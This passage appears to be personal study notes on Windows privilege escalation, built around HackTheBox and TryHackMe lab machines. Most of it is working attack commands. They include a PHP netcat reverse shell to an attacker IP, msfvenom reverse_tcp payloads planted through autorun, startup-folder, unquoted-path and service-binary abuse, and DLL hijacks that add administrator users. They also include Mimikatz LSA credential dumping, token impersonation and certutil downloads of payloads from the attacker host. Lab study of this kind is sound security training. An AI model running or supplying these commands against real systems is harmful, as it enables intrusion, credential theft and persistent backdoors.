<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">plink.exe</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">kali</span><span class="w"> </span><span class="nx">user</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-pw</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">kali</span><span class="w"> </span><span class="nx">password</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-R</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">port</span><span class="w"> </span><span class="nx">we</span><span class="w"> </span><span class="nx">want</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">forward</span><span class="err">&gt;</span><span class="p">:</span><span class="nx">127.0.0.1:</span><span class="err">&lt;</span><span class="nx">kali</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">receive</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">kali</span><span class="w"> </span><span class="nx">ip</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div></div>

<p>We should gain a kali root shell:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netstat -ano = to show if the port sent is open now
winexe -U Administrator%&lt;password reuse&gt; //127.0.0.1 "cmd.exe"
</code></pre></div></div>

<blockquote>
  <p>hit enter a couple of times, if the shell gets stuck</p>
</blockquote>

<ul>
  <li>we should have root access in the windows machine</li>
  <li>if we want to improve the shell, we could send a netcat to the target and get the connection</li>
</ul>

<h1 id="escalation-path-windows-subsystem-for-linux">Escalation Path: Windows Subsystem for Linux</h1>

<p>Spawning a TTY Shell - https://netsec.ws/?p=337</p>

<p>Impacket Toolkit - https://github.com/SecureAuthCorp/impacket</p>

<h2 id="overview">Overview</h2>
<p>EoP - Windows Subsytem For Linux (WSL)</p>

<p>With root privileges WSL allows users to create a bind shell on any port (no elevation needed).</p>

<p>Dont know the root password? No problem, just set the default user to root W/ <strong>.exe –default-user root</strong>.</p>

<p>Now Start your bind shell or reverse.</p>

<p>if u find user/password and the machine has smb</p>

<p>try psexec/smbexec/wmiexec:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>psexec.py &lt;user:<span class="s1">'password'</span>@target ip&gt;
</code></pre></div></div>

<blockquote>
  <p>it wil test your credential.</p>
</blockquote>

<p>Rev shell in PHP:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nb">system</span><span class="p">(</span><span class="s1">'nc.exe -e cmd.exe &lt;kali ip&gt; &lt;port&gt;'</span><span class="p">)</span>
<span class="o">&gt;</span>
</code></pre></div></div>

<h3 id="escalation-via-wsl">Escalation via WSL</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">where</span><span class="w"> </span><span class="nx">/R</span><span class="w"> </span><span class="nx">c:\windows</span><span class="w"> </span><span class="nx">bash.exe</span><span class="w">
</span><span class="n">where</span><span class="w"> </span><span class="nx">/R</span><span class="w"> </span><span class="nx">c:\windows</span><span class="w">  </span><span class="nx">wsl.exe</span><span class="w">

</span><span class="err">&lt;</span><span class="n">full</span><span class="w"> </span><span class="nx">path</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">wsl</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="w">
</span><span class="err">&lt;</span><span class="n">full</span><span class="w"> </span><span class="nx">path</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">wsl</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">python</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s1">'bind or reverse shell python code'</span><span class="w">
</span></code></pre></div></div>

<p>If we execute the bash.exe, we are gonna be inside the WSL using Linux:</p>

<ul>
  <li>Get a better shell with <strong>pty.spawn</strong></li>
  <li>Look at the <strong>history</strong></li>
</ul>

<h1 id="impersonation-and-potato-attacks">Impersonation and Potato Attacks</h1>

<p>Rotten Potato - https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/</p>

<p>Juicy Potato - https://github.com/ohpe/juicy-potato</p>

<h2 id="what-are-tokens">What are tokens?</h2>
<p>Temporary keys that allow you access to a system/network without having to provide credentials each time you access a file. Think cookies for computers.</p>

<h3 id="two-types">Two types</h3>
<p>Delegate:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Created For logging into a machine or using Remote Desktop
</code></pre></div></div>

<p>Impersonate:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"non-interactive" such as attaching a network drive or a domain logon script
</code></pre></div></div>

<h3 id="token-impersonation">Token Impersonation</h3>
<p>in meterpreter:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- getuid
- load incognito
- list_tokens -u
- impersonate_token &lt;domain\\user&gt;
- shell
</code></pre></div></div>

<blockquote>
  <p>When we try to dump LSA for example and we dont have access. We can try impersonate other user and execute as we were him/her</p>
</blockquote>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"privilege::debug" "LSADump::LSA /inject" exit'</span><span class="w"> </span><span class="nt">-Computer</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">DC.domain.local</span><span class="err">&gt;</span><span class="w">

</span><span class="n">privilege::debug</span><span class="w">
</span><span class="nx">LSADump::LSA</span><span class="w"> </span><span class="nx">/patch</span><span class="w">
</span></code></pre></div></div>

<h3 id="impersonation-privileges">Impersonation Privileges</h3>
<p>meterpreter:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getprivs
</code></pre></div></div>
<p>shell:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">
</span></code></pre></div></div>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">SeAssignPrimaryToken</span><span class="w">
</span><span class="nx">SeImpersonatePrivilege</span><span class="w">
</span><span class="n">SeTakeOwnership</span><span class="w">
</span></code></pre></div></div>

<h4 id="potato-attacks">Potato Attacks</h4>
<p>if these are available, we can try juicy potato / rotten potato</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">SeAssignPrimaryToken</span><span class="w">
</span><span class="nx">SeImpersonatePrivilege</span><span class="w">
</span></code></pre></div></div>

<h2 id="jeeves-htb">Jeeves htb</h2>
<p>Groovy Reverse Shell - https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76</p>

<p>in jenkings:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># search for Script Console
# there is a rev shell using groovy, change ip/port and set a listener

# save the systeminfo in case you need to run windows-exploit-suggester.py
./windows-exploit-suggester.py --database &lt;db.xls&gt; --systeminfo &lt;systeminfo file&gt;
</code></pre></div></div>

<blockquote>
  <p>if u find vulns related to potato / hot potato / rotten potato. Try these first, cause they are gold</p>
</blockquote>

<p>msfconsole</p>

<p>use exploit/multi/script/web_delivery:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set </span>payload to windows/meterpreter/reverse_tcp
<span class="nb">set </span>target to psh <span class="o">(</span>powershell<span class="o">)</span>
<span class="nb">set </span>lhost, srvhost
</code></pre></div></div>

<blockquote>
  <p>it will generate a payload For us
run this payload in the machine, it should generate a session in our meterpreter</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run /post/multi/recon/local_exploit_suggester
</code></pre></div></div>

<h2 id="escalation">Escalation</h2>
<p>Background the session:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/windows/local/ms16_075_reflection
<span class="nb">set </span>options
run
</code></pre></div></div>

<p>meterpreter shell:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>load incognito
list_tokens <span class="nt">-u</span>
impersonate_token <span class="s2">"NT AUTHORITY</span><span class="se">\S</span><span class="s2">YSTEM"</span>
<span class="c"># root access</span>
</code></pre></div></div>

<h3 id="alternate-data-streams">Alternate Data Streams</h3>
<p>https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/</p>

<blockquote>
  <p>There is regular data stream and alternate data stream
Alternate is a way to hide information within a file</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">dir</span> /R
hm.txt:root.txt:<span class="nv">$DATA</span>
more &lt; hm.txt:root.txt:<span class="nv">$DATA</span>
</code></pre></div></div>

<h1 id="escalation-path-getsystem">Escalation Path: getsystem</h1>

<p>What happens when I type getsystem? - https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/</p>

<p>In meterpreter:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getsystem
getsystem <span class="nt">-h</span>
</code></pre></div></div>

<p>What getsystem does?</p>

<blockquote>
  <p>there is 2 types of <strong>named pipe impersonation</strong>. One is in memory and other is in disk ( probably u should not run this, because AV detects )
and there is <strong>Token Duplication</strong>, that requires <strong>SeDebugPrivileges</strong> to be enable.</p>
</blockquote>

<h1 id="escalation-path-runas">Escalation Path: RunAs</h1>

<h2 id="overview-1">Overview</h2>
<p>Allow us to run a command as somebody else</p>

<h3 id="foothold---access-htb">FootHold - Access htb</h3>
<p>Enter the FTP, grab the files</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mdb-sql &lt;db.mdb&gt; 
</code></pre></div></div>

<p>open auth_user</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>readpst &lt;pst file&gt;
</code></pre></div></div>

<ul>
  <li>grab user and password</li>
  <li>login through telnet</li>
</ul>

<h3 id="escalation-1">Escalation</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cmdkey</span><span class="w"> </span><span class="nx">/list</span><span class="w">

</span><span class="n">C:\Windows\System32\runas.exe</span><span class="w"> </span><span class="nx">/user:ACCESS\Administrator</span><span class="w"> </span><span class="nx">/savecred</span><span class="w"> </span><span class="s2">"C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt &gt; C:\Users\security\root.txt"</span><span class="w">
</span></code></pre></div></div>

<h1 id="escalation-path-registry">Escalation Path: Registry</h1>

<h2 id="overview-of-autoruns">Overview of Autoruns</h2>
<p>C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe</p>

<p>C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu “C:\Program Files\Autorun Program”</p>

<p>Run powerUp to identify the autorun vulnerabilty:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-ep</span><span class="w"> </span><span class="nx">bypass</span><span class="w">
</span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\PowerUp.ps1</span><span class="w">
</span><span class="nx">Invoke-AllChecks</span><span class="w">
</span></code></pre></div></div>

<h3 id="escalation-via-autorun">Escalation via Autorun</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=</span>&lt;kali ip&gt; <span class="nt">-f</span> exe <span class="nt">-o</span> program.exe
</code></pre></div></div>

<p>in msfconsole:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use multi/handler <span class="o">&gt;</span> <span class="nb">set </span>options
</code></pre></div></div>

<p>Send the program.exe to windows target machine and replace the windows file <strong>/Program Files/Autorun Program/program.exe</strong> by our program.exe</p>

<ul>
  <li>Now we can disconnect off the machine and log as administrator</li>
  <li>the autorun program will pop up.</li>
  <li>When u hit RUN, we get the meterpreter shell with root access</li>
</ul>

<h2 id="alwaysinstallelevated">AlwaysInstallElevated</h2>
<p>This is a configuration issue, when we can run packages with admin privileges, because <strong>install elevated</strong> is set in the register</p>

<h3 id="overview-2">Overview</h3>
<p>To test if this vulnerability is available:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query HKLM<span class="se">\S</span>oftware<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller
the value of <span class="s1">'AlwaysInstallElevated'</span> must be 1
reg query HKCU<span class="se">\S</span>oftware<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller
again the value must be 1
</code></pre></div></div>

<h3 id="escalation-2">Escalation</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># We can see the AbuseFunction in the PowerUp &gt; Invoke-AllChecks</span><span class="w">
</span><span class="c"># example: AbuseFunction : Write-UserAddMSI</span><span class="w">

</span><span class="kr">In</span><span class="w"> </span><span class="n">Powershell:</span><span class="w">
</span><span class="nx">Write-UserAddMSI</span><span class="w">
</span></code></pre></div></div>

<blockquote>
  <p>A file UserAdd is gonna appear in the same directory of the PowerUp
We will run this file. A window will pop up and we will set a backdoor user to have administrator access</p>
</blockquote>

<h3 id="with-meterpreter">with Meterpreter</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
<span class="nb">set </span>options

msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=</span>&lt;our ip&gt; <span class="nt">-f</span> msi <span class="nt">-o</span> setup.msi
<span class="c"># send to the windows target machine.</span>
<span class="c"># make sure u have a listener running &amp; run the setup.msi</span>
</code></pre></div></div>

<h3 id="another-method">Another method</h3>
<p>with meterpreter:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/windows/local/always_install_elevated
<span class="nb">set </span>the session
</code></pre></div></div>

<h2 id="regsvc-acl-overview">Regsvc ACL Overview</h2>
<p>We are gonna test if we have full control over a register key.</p>

<p>If the answer is oui, we can compile a malicious executable writen in C and make that executable run a command</p>

<h3 id="detection">Detection</h3>
<p>in powershell:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Acl</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">hklm:\System\CurrentControlSet\services\regsvc</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w">
</span><span class="c"># The correct output should be: our current user has FullControl</span><span class="w">
</span></code></pre></div></div>

<h3 id="escalation-3">Escalation</h3>
<p>In kali open a FTP server:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-m</span> pyftpdlib <span class="nt">-p</span> 21 <span class="nt">--write</span>
</code></pre></div></div>

<p>In Windows:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># send the file. </span>
ftp &lt;kali ip&gt; <span class="o">&gt;</span> log with anonymous <span class="o">&gt;</span> put windows_service.c
</code></pre></div></div>

<p>In kali with the file in hand:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># we are gonna edit</span>
<span class="c"># replace the command in the payload session &gt; system("here")</span>

cmd.exe /k net localgroup administrator user /add
</code></pre></div></div>

<blockquote>
  <p>use <strong>sudo apt install gcc-mingw-w64</strong> if needed</p>
</blockquote>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">x86_x64-w64-mingw32-gcc</span><span class="w"> </span><span class="nx">windows_service.c</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">x.exe</span><span class="w">
</span></code></pre></div></div>

<p>Send the x.exe to the C:\Temp of the Windows Machine:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">reg</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">HKLM\System\CurrentControlSet\services\regsvc</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">ImagePath</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_EXPAND_SZ</span><span class="w"> </span><span class="nx">/d</span><span class="w"> </span><span class="nx">c:\temp\x.exe</span><span class="w"> </span><span class="nx">/f</span><span class="w">
</span><span class="n">sc</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">regsvc</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w"> </span><span class="nx">administrators</span><span class="w">
</span><span class="c"># the 'user' got added</span><span class="w">
</span></code></pre></div></div>

<h1 id="escalation-path-executable-files">Escalation Path: Executable Files</h1>

<h2 id="detection-1">Detection</h2>

<h3 id="with-powerup">With PowerUp</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># we will run &lt;. .\PowerUp.ps1&gt;</span><span class="w">
</span><span class="n">Invoke-AllChecks</span><span class="w">
</span></code></pre></div></div>

<h3 id="manual-detection">Manual Detection</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\U</span>ser<span class="se">\D</span>esktop<span class="se">\T</span>ools<span class="se">\A</span>ccesschk<span class="se">\a</span>ccesschk64.exe <span class="nt">-wvu</span> <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogram Files</span><span class="se">\F</span><span class="s2">ile Permissions Service"</span>
</code></pre></div></div>

<p>Notice that the <strong>everyone</strong> user group has <strong>FILE_ALL_ACCESS</strong> permission on the filepermservice.exe file.</p>

<h3 id="escalation-4">Escalation</h3>
<p>We will generate the same malicious file:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>x86_x64-w64-mingw32-gcc windows_service.c <span class="nt">-o</span> x.exe
<span class="c"># send the x.exe</span>
</code></pre></div></div>

<p>Then replace the filepermservice.exe file:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy /y c:<span class="se">\T</span>emp<span class="se">\x</span>.exe <span class="s2">"c:</span><span class="se">\P</span><span class="s2">rogram Files</span><span class="se">\F</span><span class="s2">ile Permissions Service</span><span class="se">\f</span><span class="s2">ilepermservice.exe"</span>
sc start filepermsvc	
net localgroup administrators
</code></pre></div></div>

<blockquote>
  <p>The user has been added to the administrator group.
We have root access through this user.</p>
</blockquote>

<h1 id="escalation-path-startup-application">Escalation Path: Startup Application</h1>

<p>icacls Documentation - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls</p>

<h2 id="overview-3">Overview</h2>
<p>Same concept as the autorun attack, when we boot up our machine an application is gonna to startup.</p>

<p>We will use a malicious file to take advantage of that and get shell</p>

<p>Sadly we wont find this vulnerability with PowerUp.</p>

<h3 id="detection-2">Detection</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls.exe <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\S</span><span class="s2">tart Menu</span><span class="se">\P</span><span class="s2">rograms</span><span class="se">\S</span><span class="s2">tartup"</span>

From the output notice that the <span class="s2">"BUILTIN</span><span class="se">\U</span><span class="s2">sers"</span> group has Full access <span class="s1">'(F)'</span> to the directory

<span class="c"># F = full access</span>
<span class="c"># M = modify access</span>
<span class="c"># RX = read and execute access</span>
<span class="c"># R = read-only access</span>
</code></pre></div></div>

<h3 id="escalation-5">Escalation</h3>
<p>msfconsole listener:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use multi/handler
<span class="nb">set </span>options

msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=</span>&lt;kali ip&gt; <span class="nt">-f</span> exe <span class="nt">-o</span> y.exe
</code></pre></div></div>

<p>Send the exploit to the target machine.</p>

<blockquote>
  <p>Again, we can open a FTP or web server with python in kali
Grab with <strong>certutils</strong> or just open in the browser</p>
</blockquote>

<p>Save the exploit in the startup folder:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\S</span>tart Menu<span class="se">\P</span>rograms<span class="se">\S</span>tartup
</code></pre></div></div>

<blockquote>
  <p>Boot the machine again &amp; just waits with a msfconsole listener to receive the connection</p>
</blockquote>

<h1 id="escalation-path-dll-hijacking">Escalation Path: DLL Hijacking</h1>

<h2 id="dll-hijacking-overview">DLL Hijacking Overview</h2>

<p>Dll = dynamic link library</p>

<p>we are looking For a dll that is trying to load and has the name not found;</p>

<ul>
  <li>if we have a writable directory For that dll then</li>
  <li>we can hijack that dll by sending a malicious file in that path.</li>
</ul>

<h3 id="escalation-6">Escalation</h3>
<p>Run process monitor:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>include to filter <span class="o">&gt;</span> Result is NAME NOT FOUND &amp; Path ends with .dll

sc stop dllsvc
sc start dllsvc
</code></pre></div></div>

<p>grab the windows_dll.c file and edit:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>System<span class="o">(</span><span class="s2">"cmd.exe /k net localgroup administrators userBatman /add"</span><span class="o">)</span><span class="p">;</span>
</code></pre></div></div>

<p>Compile it:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>x86_64-w64-mingw32-gcc windows_dll.c <span class="nt">-shared</span> <span class="nt">-o</span> hijackme.dll
</code></pre></div></div>

<p>Send to the target:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># python server &gt; grab the file</span>
<span class="c"># save the file in a directory you have write access : like C:\Temp\</span>

sc stop dllsvc
sc start dllsvc
</code></pre></div></div>

<h1 id="escalation-path-service-permissions">Escalation Path: Service Permissions</h1>

<h2 id="escalation-via-binary-paths">Escalation via Binary Paths</h2>

<h3 id="find-with-powerup">Find with PowerUp</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-ep</span><span class="w"> </span><span class="nx">bypass</span><span class="w">
</span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\PowerUp.ps1</span><span class="w">
</span><span class="nx">Invoke-AllChecks</span><span class="w">
</span></code></pre></div></div>

<h3 id="find-manually">Find manually</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>accesschk64.exe <span class="nt">-uwcv</span> Everyone <span class="k">*</span>

<span class="c"># -u = dont show errors</span>
<span class="c"># -w = only show the objects that have write access</span>
<span class="c"># -c = display the service name</span>
<span class="c"># -v = verbose</span>
</code></pre></div></div>

<p>Then run against the service itself:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>accesschk64.exe <span class="nt">-uwcv</span> daclsvc
sc qc daclsvc

<span class="c"># if we have write access to the SERVICE_CHANGE_CONFIG</span>
sc config daclsvc <span class="nv">binpath</span><span class="o">=</span> <span class="s2">"net localgroup administrators user /add"</span>

sc stop daclsvc
sc start daclsvc

net localgroup administrator 
<span class="c"># The user should be there with admin access</span>
</code></pre></div></div>

<h2 id="unquoted-service-paths">Unquoted Service Paths</h2>
<p>if you have a service executable which path is not closed with quotation marks and contains a space</p>

<p>then you can get malicious, cause when the service is unquoted, Windows search For the .exe in every space of the ImagePath.</p>

<p>Example:</p>

<p>C:\Program<strong>x</strong>Files\Unquoted<strong>x</strong>Path<strong>x</strong>Service\Common<strong>x</strong>Files\etc</p>

<p>in every <strong>x</strong> we can put a .exe file and the Windows will run.</p>

<ul>
  <li>We just gotta find one directory that we have write access.</li>
</ul>

<h3 id="can-be-found-with-powerup">Can be found with PowerUp</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell <span class="nt">-ep</span> bypass
<span class="nb">.</span> .<span class="se">\P</span>owerUp.ps1
Invoke-AllChecks
</code></pre></div></div>

<p>Open a listener:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>multi/handler <span class="o">&gt;</span> <span class="nb">set </span>options
or netcat <span class="nt">-lvnp</span> &lt;port&gt;
</code></pre></div></div>

<p>For meterpreter</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=</span>&lt;kali ip&gt; <span class="nt">-f</span> exe <span class="nt">-o</span> common.exe
</code></pre></div></div>

<p>For netcat:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/reverse_tcp <span class="nv">lhost</span><span class="o">=</span>&lt;kali ip&gt; <span class="nt">-f</span> exe <span class="nt">-o</span> common.exe
</code></pre></div></div>

<ul>
  <li>send to the target machine</li>
  <li>save in the path of the unquoted vulnerability</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc start unquotedsvc
</code></pre></div></div>

<blockquote>
  <p>we should get a shell back</p>
</blockquote>

<h2 id="steelmountain-from-tryhackme">SteelMountain from TryHackMe</h2>

<p>HFS - http file server</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Find the version and search <span class="k">in </span>meterpreter
- run the exploit
- get shell
</code></pre></div></div>

<h3 id="escalation-metasploit">Escalation Metasploit</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload &lt;powershell.ps1&gt; 
we can: <span class="nb">echo</span> <span class="s1">'Invoke-AllChecks'</span> <span class="o">&gt;&gt;</span> PowerUp.ps1
After upload: powershell <span class="nt">-ep</span> bypass .<span class="se">\P</span>owerUp.ps1
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powerup found unquoted service <span class="o">&gt;</span> AdvancedSystemCareService9
</code></pre></div></div>

<p>so we can:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc query &lt;service&gt; <span class="c"># to see more details of it</span>

sc stop &lt;service&gt;
</code></pre></div></div>

<p>set a listener:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>multi/handler
<span class="nb">set </span>options
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/x64/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=</span>&lt;kali ip&gt; <span class="nt">-f</span> exe <span class="nt">-o</span> ASCService.exe
<span class="c"># we can upload through meterpreter</span>

upload &lt;exploit&gt;
<span class="c"># and save in the unquoted path that is vulnerable</span>

sc start &lt;service&gt;
</code></pre></div></div>

<blockquote>
  <p>we should get a shell.</p>
</blockquote>

<h3 id="escalation-manual">Escalation Manual</h3>

<p>search the exploit using:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit HFS 2.3
grab the python with remote code execution
change ip and port <span class="k">in </span>the script


<span class="c"># set a listener in kali: nc -lvnp &lt;port&gt;</span>
</code></pre></div></div>

<p>we need open a web server in the same directory as our nc.exe:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-m</span> http.server 80 
</code></pre></div></div>

<p>Then execute the exploit:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python 39161.py &lt;kali ip&gt; 8080
</code></pre></div></div>

<blockquote>
  <p>we should get a shell with user access in our netcat.</p>
</blockquote>

<p>Grab the winpeas.exe:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil <span class="nt">-urlcache</span> <span class="nt">-f</span> http://&lt;kali ip&gt;/winPEAS64.exe winpeas.exe
</code></pre></div></div>

<ul>
  <li>run winpeas</li>
  <li>we should find the unquoted service</li>
  <li>we will generate with msfvenom again and send to the path of the vulnerable unquoted file</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>&lt;kali ip&gt; <span class="nv">lport</span><span class="o">=</span>&lt;port&gt; <span class="nt">-f</span> exe <span class="nt">-o</span> ASCService.exe

<span class="c"># send to the machine with the same method:</span>
python <span class="nt">-m</span> http.server
certutils <span class="nt">-urlcache</span> <span class="nt">-f</span> http://&lt;kali ip&gt;/ASCService.exe ASCService.exe

sc stop &lt;service&gt;
sc start &lt;service&gt;
</code></pre></div></div>

<blockquote>
  <p>make sure you have a listener
and we should get a shell with admin privileges</p>
</blockquote>

<h1 id="escalation-path-cve-2019-1388">Escalation Path: CVE-2019-1388</h1>

<p>Zero Day Initiative CVE-2019-1388 - https://www.youtube.com/watch?v=3BQKpPNlTSo</p>

<p>Rapid7 CVE-2019-1388 - https://www.rapid7.com/db/vulnerabilities/msft-cve-2019-1388</p>

<h2 id="overview-4">Overview</h2>

<p>An elevation of privilege vulnerability exists in Windows Certificate Dialog when it does not properly enforce user privileges.</p>

<p>We get the first access with enumeration. Found the credentials in the website</p>

<h3 id="escalation-7">Escalation</h3>
<p>We are gonna restore the file that is in the recycle bin</p>

<p>thats reference to our vulnerability cve-2019-1388</p>

<p>we can confirm this by looking at browser history</p>

